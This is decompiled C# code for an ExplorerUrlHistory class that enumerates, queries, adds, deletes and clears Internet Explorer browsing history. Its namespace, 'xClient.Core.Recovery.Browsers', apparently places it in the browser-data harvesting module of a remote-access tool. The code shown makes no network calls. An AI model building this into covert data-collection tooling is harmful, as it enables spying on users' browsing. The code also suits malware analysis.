using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000C1 RID: 193
	public class ExplorerUrlHistory : IDisposable
	{
		// Token: 0x060004FE RID: 1278 RVA: 0x000126AC File Offset: 0x000108AC
		public ExplorerUrlHistory()
		{
			this.urlHistory = new UrlHistoryClass();
			this.obj = (IUrlHistoryStg2)this.urlHistory;
			ExplorerUrlHistory.STATURLEnumerator staturlenumerator = new ExplorerUrlHistory.STATURLEnumerator((IEnumSTATURL)this.obj.EnumUrls);
			this._urlHistoryList = new List<STATURL>();
			staturlenumerator.GetUrlHistory(this._urlHistoryList);
		}

		// Token: 0x170000E8 RID: 232
		// (get) Token: 0x060004FF RID: 1279 RVA: 0x000046C5 File Offset: 0x000028C5
		public int Count
		{
			get
			{
				return this._urlHistoryList.Count;
			}
		}

		// Token: 0x06000500 RID: 1280 RVA: 0x000046D2 File Offset: 0x000028D2
		public void Dispose()
		{
			Marshal.ReleaseComObject(this.obj);
			this.urlHistory = null;
		}

		// Token: 0x06000501 RID: 1281 RVA: 0x000046E7 File Offset: 0x000028E7
		public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
		{
			this.obj.AddUrl(pocsUrl, pocsTitle, dwFlags);
		}

		// Token: 0x06000502 RID: 1282 RVA: 0x00012708 File Offset: 0x00010908
		public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
		{
			bool result;
			try
			{
				this.obj.DeleteUrl(pocsUrl, dwFlags);
				result = true;
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000503 RID: 1283 RVA: 0x0001273C File Offset: 0x0001093C
		public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
		{
			STATURL staturl = default(STATURL);
			STATURL result;
			try
			{
				this.obj.QueryUrl(pocsUrl, dwFlags, ref staturl);
				result = staturl;
			}
			catch (FileNotFoundException)
			{
				result = staturl;
			}
			return result;
		}

		// Token: 0x06000504 RID: 1284 RVA: 0x000046F7 File Offset: 0x000028F7
		public void ClearHistory()
		{
			this.obj.ClearHistory();
		}

		// Token: 0x06000505 RID: 1285 RVA: 0x00004704 File Offset: 0x00002904
		public ExplorerUrlHistory.STATURLEnumerator GetEnumerator()
		{
			return new ExplorerUrlHistory.STATURLEnumerator((IEnumSTATURL)this.obj.EnumUrls);
		}

		// Token: 0x170000E9 RID: 233
		public STATURL this[int index]
		{
			get
			{
				if (index >= this._urlHistoryList.Count || index < 0)
				{
					throw new IndexOutOfRangeException();
				}
				return this._urlHistoryList[index];
			}
			set
			{
				if (index >= this._urlHistoryList.Count || index < 0)
				{
					throw new IndexOutOfRangeException();
				}
				this._urlHistoryList[index] = value;
			}
		}

		// Token: 0x04000239 RID: 569
		private readonly IUrlHistoryStg2 obj;

		// Token: 0x0400023A RID: 570
		private UrlHistoryClass urlHistory;

		// Token: 0x0400023B RID: 571
		private List<STATURL> _urlHistoryList;

		// Token: 0x020000C2 RID: 194
		public class STATURLEnumerator
		{
			// Token: 0x06000508 RID: 1288 RVA: 0x00004768 File Offset: 0x00002968
			public STATURLEnumerator(IEnumSTATURL enumerator)
			{
				this._enumerator = enumerator;
			}

			// Token: 0x170000EA RID: 234
			// (get) Token: 0x06000509 RID: 1289 RVA: 0x00004777 File Offset: 0x00002977
			public STATURL Current
			{
				get
				{
					return this._staturl;
				}
			}

			// Token: 0x0600050A RID: 1290 RVA: 0x0000477F File Offset: 0x0000297F
			public bool MoveNext()
			{
				this._staturl = default(STATURL);
				this._enumerator.Next(1, ref this._staturl, out this._index);
				return this._index != 0;
			}

			// Token: 0x0600050B RID: 1291 RVA: 0x000047B0 File Offset: 0x000029B0
			public void Skip(int celt)
			{
				this._enumerator.Skip(celt);
			}

			// Token: 0x0600050C RID: 1292 RVA: 0x000047BE File Offset: 0x000029BE
			public void Reset()
			{
				this._enumerator.Reset();
			}

			// Token: 0x0600050D RID: 1293 RVA: 0x0001277C File Offset: 0x0001097C
			public ExplorerUrlHistory.STATURLEnumerator Clone()
			{
				IEnumSTATURL enumerator;
				this._enumerator.Clone(out enumerator);
				return new ExplorerUrlHistory.STATURLEnumerator(enumerator);
			}

			// Token: 0x0600050E RID: 1294 RVA: 0x000047CB File Offset: 0x000029CB
			public void SetFilter(string poszFilter, STATURLFLAGS dwFlags)
			{
				this._enumerator.SetFilter(poszFilter, dwFlags);
			}

			// Token: 0x0600050F RID: 1295 RVA: 0x0001279C File Offset: 0x0001099C
			public void GetUrlHistory(IList list)
			{
				for (;;)
				{
					this._staturl = default(STATURL);
					this._enumerator.Next(1, ref this._staturl, out this._index);
					if (this._index == 0)
					{
						break;
					}
					list.Add(this._staturl);
				}
				this._enumerator.Reset();
			}

			// Token: 0x0400023C RID: 572
			private readonly IEnumSTATURL _enumerator;

			// Token: 0x0400023D RID: 573
			private int _index;

			// Token: 0x0400023E RID: 574
			private STATURL _staturl;
		}
	}
}
